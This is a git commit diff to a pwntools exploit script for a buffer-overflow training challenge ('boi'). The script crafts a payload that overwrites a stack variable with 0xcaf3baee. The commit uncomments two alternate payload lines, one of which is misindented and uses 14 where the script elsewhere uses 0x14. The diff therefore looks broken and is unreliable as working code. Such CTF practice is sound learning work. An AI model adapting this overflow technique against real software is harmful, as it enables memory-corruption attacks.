3b45438143960b79cf4ffca7afc79c49f3076ce5
Adrian <71754820+lona9a@users.noreply.github.com>
2022-03-01 22:52:30 +0100

    got 120 wpm  average on typeracer but now the whole day is gone :)

--- nightmare-challenges/BOF/Variable/sploit.py
+++ nightmare-challenges/BOF/Variable/sploit.py
@@ -7,8 +7,8 @@ target = process('./boi')
 # 0xbeaf... 0x4 bytes is  what we will overwrite with 0xcaf3baee
 payload = b"\x00"*0x14 + p32(0xcaf3baee)
 
-#bytes(14) + (0xcaf3baee).to_bytes(4,"little") 
-# bytes.fromhex("00" * 0x14 + "EE BA F3 CA")
+bytes(14) + (0xcaf3baee).to_bytes(4,"little") 
+ bytes.fromhex("00" * 0x14 + "EE BA F3 CA")
 
 
 target.send(payload)
